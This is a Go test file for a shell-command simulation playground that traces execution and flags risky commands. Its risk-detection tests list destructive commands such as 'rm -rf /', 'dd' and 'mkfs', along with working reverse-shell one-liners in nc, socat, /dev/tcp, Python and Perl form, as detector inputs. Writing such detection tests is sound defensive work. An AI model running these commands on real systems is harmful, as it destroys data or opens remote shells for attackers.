package main

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/nullptrpanic/libcommand"
	commandanalysis "github.com/nullptrpanic/libcommand/analysis"
)

func TestAnalyzeJSONRecordsObservedCommand(t *testing.T) {
	encoded := analyzeJSON(`{
		"source":"record \"$1\"",
		"args":["value"],
		"commands":[{"name":"record","exitCode":5}],
		"maxExecutionSteps":1000,
		"maxMemoryBytes":2097152
	}`)
	var response playgroundResponse
	if err := json.Unmarshal([]byte(encoded), &response); err != nil {
		t.Fatal(err)
	}
	if response.Error != "" {
		t.Fatal(response.Error)
	}
	if len(response.Invocations) != 1 {
		t.Fatalf("invocations = %#v, want one", response.Invocations)
	}
	invocation := response.Invocations[0]
	if invocation.Invocation.Name != "record" || invocation.Invocation.Args[0].Value != "value" {
		t.Fatalf("invocation = %#v", invocation)
	}
	if invocation.Result == nil || invocation.Result.ExitCode != 5 {
		t.Fatalf("result = %#v, want exit code 5", invocation.Result)
	}
	if len(response.Nodes) == 0 || len(response.Events) == 0 || response.DurationMicros < 0 {
		t.Fatalf("response = %#v", response)
	}
}

func TestParseSourceJSONReturnsStaticASTWithoutExecution(t *testing.T) {
	encoded := parseSourceJSON(`{"source":"echo before; if true; then echo inside; fi"}`)
	var response playgroundResponse
	if err := json.Unmarshal([]byte(encoded), &response); err != nil {
		t.Fatal(err)
	}
	if response.Error != "" {
		t.Fatal(response.Error)
	}
	if len(response.Nodes) != 4 {
		t.Fatalf("nodes = %#v, want four static statements", response.Nodes)
	}
	if len(response.Events) != 0 || len(response.Invocations) != 0 || len(response.Outputs) != 0 || response.DurationMicros != 0 {
		t.Fatalf("parse-only response executed Shell state: %#v", response)
	}
}

func TestAnalyzeRecordsBuiltinRuntimeCommands(t *testing.T) {
	response := analyze(&playgroundRequest{
		Source: "echo bGFyay1jbGk= | base64 -d",
	}, maximumTraceEvents)
	if response.Error != "" {
		t.Fatal(response.Error)
	}
	if len(response.Invocations) != 2 {
		t.Fatalf("invocations = %#v, want echo and base64", response.Invocations)
	}
	if response.Invocations[0].Invocation.Name != "echo" || response.Invocations[1].Invocation.Name != "base64" {
		t.Fatalf("invocations = %#v, want runtime order echo, base64", response.Invocations)
	}
}

func TestAnalyzeStreamsRetainedTraceEvents(t *testing.T) {
	returned := false
	var streamed []*libcommand.TraceEvent
	response := analyzeWithTrace(&playgroundRequest{
		Source: "echo live",
	}, maximumTraceEvents, func(event *libcommand.TraceEvent) {
		if returned {
			t.Fatal("trace event was delivered after analyze returned")
		}
		streamed = append(streamed, event)
	})
	returned = true

	if response.Error != "" {
		t.Fatal(response.Error)
	}
	var started, finished *libcommand.TraceEvent
	for _, event := range streamed {
		switch event.Kind {
		case libcommand.TraceCommandStarted:
			started = event
		case libcommand.TraceCommandFinished:
			finished = event
		}
	}
	if started == nil || started.Invocation == nil || started.Invocation.Name != "echo" {
		t.Fatalf("streamed events = %#v, want echo command start", streamed)
	}
	if finished == nil || finished.CommandResult == nil || finished.CommandResult.Stdout != "live\n" {
		t.Fatalf("streamed events = %#v, want completed echo command", streamed)
	}
	if started.Sequence >= finished.Sequence {
		t.Fatalf("stream order = %d then %d, want start before finish", started.Sequence, finished.Sequence)
	}
	if len(streamed) != len(response.Events)+len(response.Nodes) {
		t.Fatalf("streamed events = %d, final events + nodes = %d", len(streamed), len(response.Events)+len(response.Nodes))
	}
	discovered := false
	for _, event := range streamed {
		discovered = discovered || event.Kind == libcommand.TraceNodeDiscovered && event.Node != nil
	}
	if !discovered {
		t.Fatalf("streamed events = %#v, want discovered source node", streamed)
	}
}

func TestAnalyzeStreamsDynamicNodesBeforeTheirExecution(t *testing.T) {
	var streamed []*libcommand.TraceEvent
	response := analyzeWithTrace(&playgroundRequest{
		Source: `eval 'echo dynamic'`,
	}, maximumTraceEvents, func(event *libcommand.TraceEvent) {
		streamed = append(streamed, event)
	})
	if response.Error != "" {
		t.Fatal(response.Error)
	}

	var discoveredSequence, startedSequence uint64
	for _, event := range streamed {
		if event.Node != nil && event.Node.Snippet == "echo dynamic" {
			switch event.Kind {
			case libcommand.TraceNodeDiscovered:
				discoveredSequence = event.Sequence
			case libcommand.TraceStatementStarted:
				startedSequence = event.Sequence
			}
		}
	}
	if discoveredSequence == 0 || startedSequence == 0 || discoveredSequence >= startedSequence {
		t.Fatalf("dynamic node stream order = discovered %d, started %d", discoveredSequence, startedSequence)
	}
	foundDynamic := false
	for _, node := range response.Nodes {
		foundDynamic = foundDynamic || node.Snippet == "echo dynamic"
	}
	if !foundDynamic {
		t.Fatalf("runtime nodes = %#v, want dynamically parsed command", response.Nodes)
	}
	if response.ASTNodeCount == 0 || response.ASTNodeCount >= len(response.Nodes) {
		t.Fatalf("static node count = %d, runtime nodes = %d", response.ASTNodeCount, len(response.Nodes))
	}
	for _, node := range response.Nodes[:response.ASTNodeCount] {
		if node.Snippet == "echo dynamic" {
			t.Fatalf("static AST nodes = %#v, must not include dynamically parsed command", response.Nodes[:response.ASTNodeCount])
		}
	}
}

func TestAnalyzeRecordsUnregisteredCommandAsUnresolved(t *testing.T) {
	response := analyze(&playgroundRequest{
		Source: "external-command value",
	}, maximumTraceEvents)
	if response.Error != "" {
		t.Fatal(response.Error)
	}
	if len(response.Invocations) != 1 || response.Invocations[0].Invocation.Name != "external-command" {
		t.Fatalf("invocations = %#v, want external-command", response.Invocations)
	}
	result := response.Invocations[0].Result
	if result == nil || !result.Unresolved {
		t.Fatalf("result = %#v, want unresolved", result)
	}
}

func TestAnalyzeRecordsRiskWithoutStoppingSimulation(t *testing.T) {
	response := analyze(&playgroundRequest{
		Source: "rm -rf /; echo continued",
	}, maximumTraceEvents)

	if response.Error != "" {
		t.Fatalf("response error = %q, want non-blocking detection", response.Error)
	}
	if len(response.Detections) != 1 {
		t.Fatalf("detections = %#v, want one", response.Detections)
	}
	detection := response.Detections[0]
	if detection.Command != "rm" || detection.Type != "destructive_operation" || detection.NodeID == 0 || detection.PathID == 0 || detection.Sequence == 0 {
		t.Fatalf("detection = %#v, want located rm risk", detection)
	}
	if !strings.Contains(detection.Error, "command risk detected") {
		t.Fatalf("detection error = %q, want classified risk", detection.Error)
	}
	if len(response.Invocations) != 2 || response.Invocations[1].Invocation.Name != "echo" {
		t.Fatalf("invocations = %#v, want execution to continue through echo", response.Invocations)
	}
}

func TestAnalyzeAppliesDetectionMiddlewareToBuiltinCommands(t *testing.T) {
	previous, existed := playgroundAnalysisCommands["echo"]
	playgroundAnalysisCommands["echo"] = commandanalysis.RM
	t.Cleanup(func() {
		if existed {
			playgroundAnalysisCommands["echo"] = previous
			return
		}
		delete(playgroundAnalysisCommands, "echo")
	})

	response := analyze(&playgroundRequest{Source: "echo -rf /"}, maximumTraceEvents)
	if response.Error != "" || len(response.Detections) != 1 {
		t.Fatalf("response = %#v, want builtin invocation analyzed without changing its result", response)
	}
	if response.Detections[0].Command != "echo" {
		t.Fatalf("detection = %#v, want echo", response.Detections[0])
	}
	if len(response.Invocations) != 1 || response.Invocations[0].Result == nil || response.Invocations[0].Result.Stdout != "-rf /\n" {
		t.Fatalf("invocations = %#v, want original echo result", response.Invocations)
	}
}

func TestAnalyzeRegistersCommonRiskCommands(t *testing.T) {
	tests := []*struct {
		name     string
		source   string
		command  string
		riskType commandanalysis.RiskType
	}{
		{name: "absolute rm", source: "/bin/rm -rf /", command: "/bin/rm", riskType: commandanalysis.RiskTypeDestructiveOperation},
		{name: "poweroff", source: "poweroff", command: "poweroff", riskType: commandanalysis.RiskTypeDestructiveOperation},
		{name: "reboot", source: "reboot", command: "reboot", riskType: commandanalysis.RiskTypeDestructiveOperation},
		{name: "halt", source: "halt", command: "halt", riskType: commandanalysis.RiskTypeDestructiveOperation},
		{name: "shutdown", source: "shutdown now", command: "shutdown", riskType: commandanalysis.RiskTypeDestructiveOperation},
		{name: "init", source: "init 0", command: "init", riskType: commandanalysis.RiskTypeDestructiveOperation},
		{name: "telinit", source: "telinit 6", command: "telinit", riskType: commandanalysis.RiskTypeDestructiveOperation},
		{name: "systemctl", source: "systemctl poweroff", command: "systemctl", riskType: commandanalysis.RiskTypeDestructiveOperation},
		{name: "nc", source: "nc -e /bin/sh 10.0.0.1 4444", command: "nc", riskType: commandanalysis.RiskTypeReverseShell},
		{name: "ncat", source: "ncat --exec=/bin/sh 10.0.0.1 4444", command: "ncat", riskType: commandanalysis.RiskTypeReverseShell},
		{name: "netcat", source: "netcat -c /bin/sh 10.0.0.1 4444", command: "netcat", riskType: commandanalysis.RiskTypeReverseShell},
		{name: "socat", source: "socat TCP:10.0.0.1:4444 EXEC:/bin/sh", command: "socat", riskType: commandanalysis.RiskTypeReverseShell},
		{name: "find delete", source: "find / -delete", command: "find", riskType: commandanalysis.RiskTypeDestructiveOperation},
		{name: "mkfs variant", source: "mkfs.ext4 /dev/sda1", command: "mkfs.ext4", riskType: commandanalysis.RiskTypeDestructiveOperation},
		{name: "wipefs", source: "wipefs --all /dev/nvme0n1", command: "wipefs", riskType: commandanalysis.RiskTypeDestructiveOperation},
		{name: "dd", source: "dd if=/dev/zero of=/dev/vda", command: "dd", riskType: commandanalysis.RiskTypeDestructiveOperation},
		{name: "shell network channel", source: "sh -i >& /dev/tcp/10.0.0.1/4444 0>&1", command: "sh", riskType: commandanalysis.RiskTypeReverseShell},
		{name: "versioned Python reverse shell", source: `python3.11 -c 'import os,socket,pty;s=socket.socket();s.connect(("198.51.100.42",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`, command: "python3.11", riskType: commandanalysis.RiskTypeReverseShell},
		{name: "Perl reverse shell", source: `perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in(4444,inet_aton("198.51.100.42")));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'`, command: "perl", riskType: commandanalysis.RiskTypeReverseShell},
		{name: "sudo wrapper", source: "sudo rm -rf /", command: "rm", riskType: commandanalysis.RiskTypeDestructiveOperation},
		{name: "nested shell wrapper", source: "sudo sh -c 'setsid rm -rf /'", command: "rm", riskType: commandanalysis.RiskTypeDestructiveOperation},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			response := analyze(&playgroundRequest{Source: test.source}, maximumTraceEvents)
			if response.Error != "" || len(response.Detections) != 1 {
				t.Fatalf("response = %#v, want one non-blocking detection", response)
			}
			if got := response.Detections[0].Command; got != test.command {
				t.Fatalf("detected command = %q, want %q", got, test.command)
			}
			if got := response.Detections[0].Type; got != test.riskType {
				t.Fatalf("detected type = %q, want %q", got, test.riskType)
			}
		})
	}
}

func TestAnalyzeDoesNotClassifyOrdinaryNetworkActivity(t *testing.T) {
	tests := []string{
		`nc 10.0.0.1 4444`,
		`nc >/dev/tcp/10.0.0.1/4444`,
		`bash -i >/dev/tcp/10.0.0.1/4444`,
		`producer | bash -i`,
		`socat STDIO EXEC:/bin/sh`,
	}
	for _, source := range tests {
		response := analyze(&playgroundRequest{Source: source}, maximumTraceEvents)
		if response.Error != "" || len(response.Detections) != 0 {
			t.Fatalf("source %q: response = %#v, want no risk", source, response)
		}
	}
}

func TestAnalyzeRunsDetectionBeforeConfiguredCommandAndKeepsItsResult(t *testing.T) {
	response := analyze(&playgroundRequest{
		Source: "rm -rf /",
		Commands: []*playgroundCommand{{
			Name:     "rm",
			Stdout:   "configured output",
			ExitCode: 7,
		}},
	}, maximumTraceEvents)

	if response.Error != "" || len(response.Detections) != 1 {
		t.Fatalf("response = %#v, want non-blocking detection", response)
	}
	if len(response.Invocations) != 1 || response.Invocations[0].Result == nil {
		t.Fatalf("invocations = %#v, want configured command result", response.Invocations)
	}
	result := response.Invocations[0].Result
	if result.Stdout != "configured output" || result.ExitCode != 7 || result.Unresolved {
		t.Fatalf("result = %#v, want configured handler to remain authoritative", result)
	}
}

func TestAnalyzeRunsDetectionBeforeJavaScriptCommand(t *testing.T) {
	source := `return { stdout: "javascript output", exitCode: 3 };`
	response := analyze(&playgroundRequest{
		Source:   "rm -rf /",
		Commands: []*playgroundCommand{{Name: "rm", JavaScript: &source}},
	}, maximumTraceEvents)

	if len(response.Detections) != 1 {
		t.Fatalf("detections = %#v, want risk before JavaScript handler", response.Detections)
	}
	if !strings.Contains(response.Error, "JavaScript command handlers require the browser Playground") {
		t.Fatalf("response error = %q, want JavaScript adapter result instead of detection error", response.Error)
	}
}

func TestAnalyzeReportsFinalPathOutputs(t *testing.T) {
	response := analyze(&playgroundRequest{
		Source: "printf out; printf err >&2; false",
	}, maximumTraceEvents)

	if response.Error != "" || len(response.Outputs) != 1 {
		t.Fatalf("response = %#v", response)
	}
	output := response.Outputs[0]
	if output.PathID == 0 || output.Result == nil {
		t.Fatalf("output = %#v", output)
	}
	if output.Result.Stdout != "out" || output.Result.Stderr != "err" || output.Result.ExitCode != 1 {
		t.Fatalf("path result = %#v", output.Result)
	}
}

func TestAnalyzeReportsConfiguredCommandError(t *testing.T) {
	response := analyze(&playgroundRequest{
		Source:   "fail",
		Commands: []*playgroundCommand{{Name: "fail", Error: "handler failed"}},
	}, maximumTraceEvents)

	if !strings.Contains(response.Error, "handler failed") || len(response.Outputs) != 1 {
		t.Fatalf("response = %#v", response)
	}
	if result := response.Outputs[0].Result; result == nil || !strings.Contains(result.Error, "handler failed") {
		t.Fatalf("output = %#v", response.Outputs[0])
	}
}

func TestAnalyzeJSONRejectsEmptyJavaScriptCommand(t *testing.T) {
	var response playgroundResponse
	encoded := analyzeJSON(`{"source":"record","commands":[{"name":"record","javascript":"  "}]}`)
	if err := json.Unmarshal([]byte(encoded), &response); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(response.Error, "JavaScript handler source") {
		t.Fatalf("error = %q, want JavaScript source validation", response.Error)
	}
}

func TestAnalyzeJSONRejectsJavaScriptCommandWithFixedResult(t *testing.T) {
	var response playgroundResponse
	encoded := analyzeJSON(`{"source":"record","commands":[{"name":"record","javascript":"return {};","stdout":"fixed"}]}`)
	if err := json.Unmarshal([]byte(encoded), &response); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(response.Error, "cannot define a fixed result") {
		t.Fatalf("error = %q, want mutually exclusive command outcomes", response.Error)
	}
}

func TestAnalyzeJavaScriptCommandUsesPlatformAdapter(t *testing.T) {
	source := "return { stdout: invocation.name };"
	response := analyze(&playgroundRequest{
		Source:   "record",
		Commands: []*playgroundCommand{{Name: "record", JavaScript: &source}},
	}, maximumTraceEvents)

	if !strings.Contains(response.Error, "require the browser Playground") {
		t.Fatalf("response error = %q, want native adapter error", response.Error)
	}
	if len(response.Invocations) != 1 || response.Invocations[0].Invocation.Name != "record" {
		t.Fatalf("invocations = %#v, want the JavaScript command invocation", response.Invocations)
	}
}

func TestAnalyzeIncludesNodeContextSnapshots(t *testing.T) {
	response := analyze(&playgroundRequest{
		Source: "printf done",
		Env:    map[string]string{"TOKEN": "secret"},
		Args:   []string{"first"},
		Stdin:  "line\n",
	}, maximumTraceEvents)

	var started, finished *libcommand.TraceStateSnapshot
	for _, event := range response.Events {
		switch event.Kind {
		case libcommand.TraceStatementStarted:
			started = event.Snapshot
		case libcommand.TraceStatementFinished:
			finished = event.Snapshot
		}
	}
	if started == nil || finished == nil {
		t.Fatalf("response events = %#v, want state snapshots", response.Events)
	}
	if started.Stdin != "line\n" || len(started.Args) != 1 || started.Args[0] != "first" {
		t.Fatalf("input snapshot = %#v", started)
	}
	if finished.Stdout != "done" {
		t.Fatalf("output snapshot = %#v", finished)
	}
}

func TestAnalyzeIncludesCurrentCommandOutput(t *testing.T) {
	response := analyze(&playgroundRequest{
		Source: "echo 'simulation complete'",
	}, maximumTraceEvents)
	if response.Error != "" {
		t.Fatal(response.Error)
	}
	for _, event := range response.Events {
		if event.Kind != libcommand.TraceCommandFinished || event.Node == nil || event.Node.Snippet != "echo 'simulation complete'" {
			continue
		}
		result := event.CommandResult
		if result == nil || !result.OutputCaptured || result.Stdout != "simulation complete\n" || result.Stderr != "" {
			t.Fatalf("echo command result = %#v", result)
		}
		if result.StdoutUnresolved || result.StderrUnresolved || result.ExitCodeUnresolved {
			t.Fatalf("echo command certainty = %#v, want concrete output", result)
		}
		return
	}
	t.Fatalf("events = %#v, want echo command result", response.Events)
}

func TestAnalyzeJSONUsesBrowserInvocationFieldNames(t *testing.T) {
	encoded := analyzeJSON(`{"source":"record value","commands":[{"name":"record"}]}`)
	if !strings.Contains(encoded, `"invocation":{"name":"record","args":[{"kind":0,"value":"value"}]`) {
		t.Fatalf("response does not use the browser invocation schema: %s", encoded)
	}
	if strings.Contains(encoded, `"Name":`) || strings.Contains(encoded, `"Args":`) {
		t.Fatalf("response exposes Go field names: %s", encoded)
	}
}

func TestAnalyzeJSONReturnsParseErrorAsData(t *testing.T) {
	var response playgroundResponse
	if err := json.Unmarshal([]byte(analyzeJSON(`{"source":"if"}`)), &response); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(response.Error, "parse bash") {
		t.Fatalf("error = %q, want parse bash", response.Error)
	}
}

func TestAnalyzeStopsCollectingTraceAtDisplayLimit(t *testing.T) {
	response := analyze(&playgroundRequest{
		Source: "echo one\necho two\necho three",
	}, 2)
	if !response.Truncated {
		t.Fatal("trace was not marked truncated")
	}
	if got := len(response.Nodes) + len(response.Events); got != 2 {
		t.Fatalf("collected trace items = %d, want 2", got)
	}
}

func TestAnalyzeStopsCollectingTraceAtDisplayByteLimit(t *testing.T) {
	response := analyze(&playgroundRequest{
		Source:   strings.Repeat("record \"$BIG\"\n", 100),
		Env:      map[string]string{"BIG": strings.Repeat("x", 10<<10)},
		Commands: []*playgroundCommand{{Name: "record"}},
	}, maximumTraceEvents)
	if !response.Truncated {
		t.Fatal("trace was not marked truncated")
	}
	if len(response.Events) >= 100 {
		t.Fatalf("events = %d, want display-byte cap to stop collection", len(response.Events))
	}
}

func TestAnalyzePreservesTypedUnresolvedInvocation(t *testing.T) {
	response := analyze(&playgroundRequest{
		Source:   "value=$(unknown-command); record \"$value\"",
		Commands: []*playgroundCommand{{Name: "record"}},
	}, maximumTraceEvents)
	if response.Error != "" {
		t.Fatalf("response = %#v", response)
	}
	var record *playgroundInvocation
	for _, invocation := range response.Invocations {
		if invocation.Invocation.Name == "record" {
			record = invocation
			break
		}
	}
	if record == nil {
		t.Fatalf("invocations = %#v, want record", response.Invocations)
	}
	want := libcommand.ArgumentUnresolved
	if record.Invocation.Args[0].Kind != want {
		t.Fatalf("argument = %#v, want unresolved", record.Invocation.Args[0])
	}
}

func TestAnalyzeJSONRejectsOversizedRequestBeforeDecode(t *testing.T) {
	encoded := analyzeJSON(strings.Repeat("x", maximumPlaygroundRequestBytes+1))
	var response playgroundResponse
	if err := json.Unmarshal([]byte(encoded), &response); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(response.Error, "exceeds") {
		t.Fatalf("error = %q, want size limit", response.Error)
	}
}

func TestAnalyzeJSONRejectsPlaygroundLimitsAbovePublicCap(t *testing.T) {
	var response playgroundResponse
	if err := json.Unmarshal([]byte(analyzeJSON(`{"source":":","maxExecutionSteps":100001}`)), &response); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(response.Error, "max execution steps") {
		t.Fatalf("error = %q, want execution-step cap", response.Error)
	}
}

func TestAnalyzeJSONDoesNotReturnConfiguredUnresolvedResult(t *testing.T) {
	encoded := analyzeJSON(`{"source":"record","commands":[{"name":"record","unresolved":true}]}`)
	var response playgroundResponse
	if err := json.Unmarshal([]byte(encoded), &response); err != nil {
		t.Fatal(err)
	}
	if response.Error != "" || len(response.Invocations) != 1 {
		t.Fatalf("response = %#v", response)
	}
	result := response.Invocations[0].Result
	if result == nil || result.Unresolved {
		t.Fatalf("result = %#v, want a concrete command result", result)
	}
}

func TestAnalyzeWildcardRecordsActualCommandName(t *testing.T) {
	response := analyze(&playgroundRequest{
		Source:   "external-command value",
		Commands: []*playgroundCommand{{Name: "*", ExitCode: 7}},
	}, maximumTraceEvents)
	if response.Error != "" || len(response.Invocations) != 1 {
		t.Fatalf("response = %#v", response)
	}
	if response.Invocations[0].Invocation.Name != "external-command" {
		t.Fatalf("invocation = %#v", response.Invocations[0].Invocation)
	}
	if response.Invocations[0].Result == nil || response.Invocations[0].Result.ExitCode != 7 {
		t.Fatalf("result = %#v, want exit code 7", response.Invocations[0].Result)
	}
}

func TestAnalyzeJavaScriptWildcardUsesActualCommandInvocation(t *testing.T) {
	source := "return { stdout: invocation.name };"
	response := analyze(&playgroundRequest{
		Source:   "external-command value",
		Commands: []*playgroundCommand{{Name: "*", JavaScript: &source}},
	}, maximumTraceEvents)

	if !strings.Contains(response.Error, "require the browser Playground") {
		t.Fatalf("response error = %q, want native adapter error", response.Error)
	}
	if len(response.Invocations) != 1 || response.Invocations[0].Invocation.Name != "external-command" {
		t.Fatalf("invocations = %#v, want actual wildcard invocation", response.Invocations)
	}
}
